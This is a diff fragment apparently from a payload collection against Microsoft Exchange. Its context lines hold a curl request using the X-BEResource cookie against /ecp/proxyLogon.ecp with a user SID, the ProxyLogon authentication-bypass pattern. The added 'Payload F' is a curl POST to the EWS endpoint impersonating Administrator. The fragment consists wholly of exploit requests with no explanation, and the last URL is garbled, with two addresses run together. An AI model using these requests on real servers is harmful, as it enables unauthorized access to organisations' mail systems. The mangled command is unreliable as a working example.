@@ -38,3 +38,10 @@ curl -i -s -k -X $'POST' \
     -b $'X-BEResource=danger@sserver.internal.local:444/ecp/proxyLogon.ecp?a=~1942062522' \
     --data-binary $'<r at=\"Negotiate\"\x0d\x0aln=\"jane\"><s>S-1-5-21-1544262530-3153604567-1803344855-1148</s></r>\x0d\x0a\x0d\x0a' \
     $'https://server.external.local/ecp/z.js'
+    
+Payload F
+
+curl -i -s -k -X $'POST' \
+    -H $'Cache-Control: no-cache' -H $'Connection: Keep-Alive' -H $'Pragma: no-cache' -H $'Content-Type: text/xml' -H $'User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.13127; Pro)' -H $'Client-Request-Id: {11527508-55EA-4FFE-922F-91EC54F79180}' -H $'X-User-Identity: Administrator@externaldomain.local' -H $'X-MS-Negotiate: Server' -H $'X-Accept: application/json' -H $'Depth: 0' -H $'Content-Length: 426' -H $'Host: localhost' -H $'Authorization: Negotiate {NEGOTIATE PACKET NLTM}' \
+    --data-binary $'<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Header><RequestServerVersion Version=\"V2018_01_08\" xmlns=\"http://schemas.microsoft.com/exchange/services/2006/types\"/><MailboxCulture xmlns=\"http://schemas.microsoft.com/exchange/services/2006/types\">en-US</MailboxCulture></s:Header><s:Body><GetUnifiedGroupsSettings xmlns=\"http://schemas.microsoft.com/exchange/services/2006/messages\"/></s:Body></s:Envelope>' \
+    $'https://pwnstar.pwndefend.comhttps://externaldomain.local/EWS/Exchange.asmx'
